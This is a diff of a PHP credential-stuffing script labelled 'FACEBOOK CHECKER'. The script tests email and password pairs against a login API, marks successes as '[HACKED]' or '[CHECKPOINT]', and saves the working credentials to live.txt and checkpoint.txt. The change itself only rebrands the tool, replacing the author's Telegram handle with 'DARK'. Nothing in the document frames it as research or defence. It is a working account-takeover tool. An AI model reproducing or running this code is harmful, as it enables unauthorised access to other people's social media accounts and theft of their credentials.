@@ -8,7 +8,7 @@ echo "$cyan+------------------------------------------------+
   ╠╣ ├─┤│  ├┤ ├┴┐│ ││ │├┴┐  │  ├─┤├┤ │  ├┴┐├┤ ├┬┘
   ╚  ┴ ┴└─┘└─┘└─┘└─┘└─┘┴ ┴  └─┘┴ ┴└─┘└─┘┴ ┴└─┘┴└─
     ".date("Y-m-d H:i:s")."     FACEBOOK CHECKER
-             Tele ==> @itzthedevil
+             dark
 +------------------------------------------------+ \n\n";
 
 if(isset($argv[1])) {
@@ -45,10 +45,10 @@ function cekfb($email, $passwd) {
 	  //echo "\e[1;34m";
     $empas = $email.":".$passwd;
     if(isset($hasilcreate->access_token)) { 
-        echo "\e[1;92m============[HACKED]============\e[1;0m\n"."\e[1;92m"."E-mail ==> ". $email."\nPassWord ==> ".$passwd."\n============[WHISER]============\nTeleGram ==> @itzthedevil".PHP_EOL;
+        echo "\e[1;92m============[HACKED]============\e[1;0m\n"."\e[1;92m"."E-mail ==> ". $email."\nPassWord ==> ".$passwd."\n============[DARK]============\n".PHP_EOL;
         file_put_contents("live.txt", $empas.PHP_EOL, FILE_APPEND);
     }elseif($hasilcreate->error_code == 405 || preg_match("/User must verify their account/i", $hasilcreate->error_msg)) {
-		echo  "\e[1;91m==========[CHECKPOINT]==========\e[1;0m\n"."\e[1;91m"."E-mail ==> ".$email."\nPassWord ==> ".$passwd."\n============[WHISER]============\nTeleGram ==> @itzthedevil".PHP_EOL;
+		echo  "\e[1;91m==========[CHECKPOINT]==========\e[1;0m\n"."\e[1;91m"."E-mail ==> ".$email."\nPassWord ==> ".$passwd."\n============[DARK]============\n".PHP_EOL;
         file_put_contents("checkpoint.txt", $empas.PHP_EOL, FILE_APPEND);
     }else echo  "\e[1;90m".$empas."\e[1;90m [Not Found]".PHP_EOL;
 }
